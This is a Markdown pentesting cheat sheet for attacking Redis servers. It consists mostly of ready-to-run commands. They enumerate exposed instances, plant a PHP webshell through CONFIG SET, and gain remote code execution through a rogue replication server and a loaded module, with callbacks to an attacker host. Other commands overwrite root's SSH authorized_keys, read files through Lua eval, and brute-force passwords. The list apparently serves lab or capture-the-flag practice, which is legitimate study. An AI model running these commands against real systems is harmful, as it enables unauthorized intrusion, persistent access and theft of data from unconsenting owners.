# Redis Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating Redis (port 6379), I realistically expect to find:

- [ ] Open access with no authentication
- [ ] Valid passwords found via brute-force
- [ ] Ability to enumerate keys and sensitive data in memory
- [ ] Configuration values revealing file paths or passwords
- [ ] Ability to write files on disk (webshells, authorized_keys)
- [ ] Vulnerabilities allowing remote code execution via replication or modules
- [ ] Potential to exfiltrate user data, tokens, session IDs
- [ ] Possibility to pivot through SSRF/Gopher payloads
- [ ] Credentials that might be reused on other services (e.g., SSH)

---

## ‚úÖ Redis Pentest Checklist

- [ ] **Enumeration Using Nmap**
    ```bash
    nmap --script redis-info -sV -p 6379 <IP>
    ```

- [ ] **Enumeration Using Metasploit**
    ```bash
    use auxiliary/scanner/redis/redis_server
    ```

- [ ] **Manual Connection**
    ```bash
    telnet <IP> 6379
    nc -vn <IP> 6379
    redis-cli -h <IP>
    ```

- [ ] **Run Commands After Connecting**
    ```bash
    INFO
    KEYS *
    GET <KEY>
    CONFIG GET *
    CONFIG GET dir
    ```

- [ ] **Use Gopher for Exploitation**
    ```bash
    curl gopher://<TARGET>:6379/_GET%20flag --max-time 1
    ```

- [ ] **Check for LFI Opportunities**
    - Review configuration files:
        ```
        /etc/redis/redis.conf
        /etc/apache2/sites-enabled/000-default.conf
        /etc/systemd/system/redis.service
        ```
    - Attempt writing to webroot if found.

- [ ] **Review All Notes for Techniques and Examples**

---

## ‚úÖ Redis Useful Commands

- **Automatic Enumeration**
    ```bash
    nmap -sV --script redis-info -p 6379 <IP>
    msfconsole
    use auxiliary/scanner/redis/redis_server
    ```

- **Manual Enumeration**
    ```bash
    redis-cli -h <IP>
    INFO
    KEYS *
    GET <KEY>
    CONFIG GET *
    CONFIG GET dir
    ```

- **Using Gopher**
    ```bash
    curl gopher://<IP>:6379/_GET%20flag --max-time 1
    ```

---

## ‚úÖ Exploitation Examples

- **PHP Webshell Upload**
    ```bash
    redis-cli -h <IP> -a <PASSWORD>
    CONFIG SET dir /opt/redis-files
    CONFIG SET dbfilename rce.php
    SET test "<?php system('id'); ?>"
    SAVE
    ```

- **Using Rogue Server**
    - Repo: [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
    ```bash
    git clone https://github.com/n0b0dyCN/redis-rogue-server
    cd redis-rogue-server
    python3 redis-rogue-server.py --rhost <TARGET_IP> --lhost <ATTACKER_IP>
    ```

- **Load Redis Module for RCE**
    - Repo: [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
    ```bash
    git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
    cd RedisModules-ExecuteCommand
    make
    ftp <TARGET_IP>
    put module.so

    redis-cli -h <IP>
    MODULE LOAD /var/ftp/pub/module.so
    system.exec "id"
    ```

- **Unauthenticated Exploit via Metasploit**
    ```bash
    use exploit/linux/redis/redis_replication_cmd_exec
    set RHOSTS <IP>
    set LHOST <ATTACKER_IP>
    set SRVHOST <ATTACKER_IP>
    exploit
    ```

---

## ‚úÖ Overwriting Authorized Keys for SSH Access

- **Manual Redis-cli Method**
    ```bash
    ssh-keygen
    (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
    cat spaced_key.txt | redis-cli -h <IP> -x set ssh_key
    redis-cli -h <IP>
    CONFIG SET dir /root/.ssh/
    CONFIG SET dbfilename "authorized_keys"
    SAVE
    ssh -i ~/.ssh/id_rsa root@<IP>
    ```

- **Metasploit File Upload**
    ```bash
    use auxiliary/scanner/redis/file_upload
    set RHOSTS <IP>
    set LocalFile /root/key
    set RemoteFile /root/.ssh/authorized_keys
    run
    ```

---

## ‚úÖ Attacking Password-Protected Redis
    ```bash
    use auxiliary/scanner/redis/redis_login
    set RHOSTS <IP>
    run
    # Then:
    redis-cli -h <IP>
    AUTH <PASSWORD>
    KEYS *
    GET <KEY>
    ```

---

## ‚úÖ Eval Abuse Example
    ```bash
    redis-cli -h <IP> -p 6379 eval "dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0
    ```

---

## ‚úÖ Brute Force Options

- **Metasploit**
    ```bash
    use auxiliary/scanner/redis/redis_login
    ```

- **Nmap**
    ```bash
    nmap --script redis-brute -p 6379 <IP>
    ```

- **Hydra**
    ```bash
    hydra -P /path/to/passwords.txt redis://<IP>:6379
    ```
